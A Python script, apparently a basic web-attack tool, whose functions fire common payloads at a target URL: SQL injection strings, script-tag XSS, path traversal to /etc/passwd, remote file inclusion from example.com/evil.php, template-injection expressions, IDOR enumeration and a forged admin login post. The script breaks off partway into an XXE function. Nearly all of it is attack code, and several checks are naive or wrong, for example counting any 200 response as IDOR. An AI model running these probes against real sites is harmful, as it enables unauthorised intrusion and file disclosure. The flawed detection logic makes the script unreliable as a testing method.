import requests
from bs4 import BeautifulSoup

def exploit_sqli(url):
    """
    Exploit SQL injection vulnerabilities in a given URL.
    """
    print(f"[+] Exploiting SQL injection vulnerability in {url}")
    
    # Create a session to persist cookies
    session = requests.Session()
    
    # Try common SQL injection payloads
    payloads = ["' OR 1=1--", "' OR '1'='1", "' OR ''='", "' OR 1=1-- -"]
    
    for payload in payloads:
        # Inject the payload into the URL
        injected_url = f"{url}?id={payload}"
        print(f"[*] Trying payload: {payload}")
        
        # Send the request and get the response
        response = session.get(injected_url)
        
        # Check if the payload was successful
        if "SQL syntax" in response.text:
            print(f"[+] SQL injection vulnerability found in {url}")
            return
    
    print(f"[-] No SQL injection vulnerability found in {url}")

def exploit_xss(url):
    """
    Exploit XSS vulnerabilities in a given URL.
    """
    print(f"[+] Exploiting XSS vulnerability in {url}")
    
    # Create a session to persist cookies
    session = requests.Session()
    
    # Try common XSS payloads
    payloads = ["' OR 1=1--", "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
    
    for payload in payloads:
        # Inject the payload into the URL
        injected_url = f"{url}?search={payload}"
        print(f"[*] Trying payload: {payload}")
        
        # Send the request and get the response
        response = session.get(injected_url)
        
        # Check if the payload was successful
        if payload in response.text:
            print(f"[+] XSS vulnerability found in {url}")
            return
    
    print(f"[-] No XSS vulnerability found in {url}")

def exploit_idor(url):
    """
    Exploit IDOR (Insecure Direct Object Reference) vulnerabilities in a given URL.
    """
    print(f"[+] Exploiting IDOR vulnerability in {url}")
    
    # Create a session to persist cookies
    session = requests.Session()
    
    # Try common IDOR payloads
    payloads = ["1", "2", "3", "4", "5"]
    
    for payload in payloads:
        # Inject the payload into the URL
        injected_url = f"{url}/user/{payload}"
        print(f"[*] Trying payload: {payload}")
        
        # Send the request and get the response
        response = session.get(injected_url)
        
        # Check if the payload was successful
        if response.status_code == 200:
            print(f"[+] IDOR vulnerability found in {url}")
            return
    
    print(f"[-] No IDOR vulnerability found in {url}")

def exploit_lfi(url):
    """
    Exploit LFI (Local File Inclusion) vulnerabilities in a given URL.
    """
    print(f"[+] Exploiting LFI vulnerability in {url}")
    
    # Create a session to persist cookies
    session = requests.Session()
    
    # Try common LFI payloads
    payloads = ["/etc/passwd", "../../../../../../etc/passwd", "../../../../../../../../../../../../../../../../../../etc/passwd"]
    
    for payload in payloads:
        # Inject the payload into the URL
        injected_url = f"{url}?file={payload}"
        print(f"[*] Trying payload: {payload}")
        
        # Send the request and get the response
        response = session.get(injected_url)
        
        # Check if the payload was successful
        if "root:" in response.text:
            print(f"[+] LFI vulnerability found in {url}")
            return
    
    print(f"[-] No LFI vulnerability found in {url}")

def exploit_rfi(url):
    """
    Exploit RFI (Remote File Inclusion) vulnerabilities in a given URL.
    """
    print(f"[+] Exploiting RFI vulnerability in {url}")
    
    # Create a session to persist cookies
    session = requests.Session()
    
    # Try common RFI payloads
    payloads = ["http://example.com/evil.php", "https://example.com/evil.php", "gopher://example.com/evil.php"]
    
    for payload in payloads:
        # Inject the payload into the URL
        injected_url = f"{url}?url={payload}"
        print(f"[*] Trying payload: {payload}")
        
        # Send the request and get the response
        response = session.get(injected_url)
        
        # Check if the payload was successful
        if "malicious" in response.text:
            print(f"[+] RFI vulnerability found in {url}")
            return
    
    print(f"[-] No RFI vulnerability found in {url}")

def exploit_csrf(url):
    """
    Exploit CSRF (Cross-Site Request Forgery) vulnerabilities in a given URL.
    """
    print(f"[+] Exploiting CSRF vulnerability in {url}")
    
    # Create a session to persist cookies
    session = requests.Session()
    
    # Send a GET request to the URL to get the CSRF token
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
    
    # Create a malicious form data with the CSRF token
    malicious_data = {
        'csrf_token': csrf_token,
        'username': 'admin',
        'password': 'password'
    }
    
    # Send a POST request with the malicious data to the URL
    response = session.post(url, data=malicious_data)
    
    # Check if the CSRF vulnerability was successful
    if "admin" in response.text:
        print(f"[+] CSRF vulnerability found in {url}")
    else:
        print(f"[-] No CSRF vulnerability found in {url}")

def exploit_ssti(url):
    """
    Exploit SSTI (Server-Side Template Injection) vulnerabilities in a given URL.
    """
    print(f"[+] Exploiting SSTI vulnerability in {url}")
    
    # Create a session to persist cookies
    session = requests.Session()
    
    # Try common SSTI payloads
    payloads = ["{{7*7}}", "${{7*7}}", "<%= 7*7 %>", "${7*7}"]
    
    for payload in payloads:
        # Inject the payload into the URL
        injected_url = f"{url}?name={payload}"
        print(f"[*] Trying payload: {payload}")
        
        # Send the request and get the response
        response = session.get(injected_url)
        
        # Check if the payload was successful
        if "49" in response.text:
            print(f"[+] SSTI vulnerability found in {url}")
            return
    
    print(f"[-] No SSTI vulnerability found in {url}")

def exploit_xxe(url):
    """
    Exploit XXE (XML External Entity) vulnerabilities in a given URL.
    """
    print(f"[+] Exploiting XXE vulnerability in {url}")
    
    # Create a session to persist cookies
    session = requests.Session()
    